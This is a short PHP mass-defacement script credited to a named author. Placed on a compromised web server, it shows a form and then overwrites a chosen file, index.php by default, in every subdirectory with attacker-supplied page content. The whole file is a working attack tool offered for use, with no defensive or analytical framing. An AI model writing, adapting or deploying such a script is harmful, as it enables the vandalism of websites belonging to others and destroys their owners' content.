<?php

/*

Mass Defacement Script By Yunus Incredibl

Contact => http://facebook.com/yunusdfgdfg123155

*/

echo "<title>Mass Defacer - By Yunus Incredibl</title>";
echo "<center><form method='POST'>";
echo "Base Dir : <input type='text' name='base_dir' size='45' value='".getcwd ()."'><br><br>";
echo "File Name : <input type='text' name='file_name' value='index.php'><br><br>";
echo "Your Index : <br><textarea style='width: 785px; height: 330px;' name='index'>//Put Your Index Here</textarea><br>";
echo "<input type='submit' value='Start'></form></center>";

if (isset ($_POST['base_dir']))
{
	if (!file_exists ($_POST['base_dir']))
		die ($_POST['base_dir']." Not Found !<br>");

	if (!is_dir ($_POST['base_dir']))
		die ($_POST['base_dir']." Is Not A Directory !<br>");

	@chdir ($_POST['base_dir']) or die ("Cannot Open Directory");

	$files = @scandir ($_POST['base_dir']) or die ("oohhh shet<br>");

	foreach ($files as $file):
		if ($file != "." && $file != ".." && @filetype ($file) == "dir")
		{
			$index = getcwd ()."/".$file."/".$_POST['file_name'];
			if (file_put_contents ($index, $_POST['index']))
				echo "$index&nbsp&nbsp&nbsp&nbsp<span style='color: green'>OK</span><br>";
		}
	endforeach;
}

?>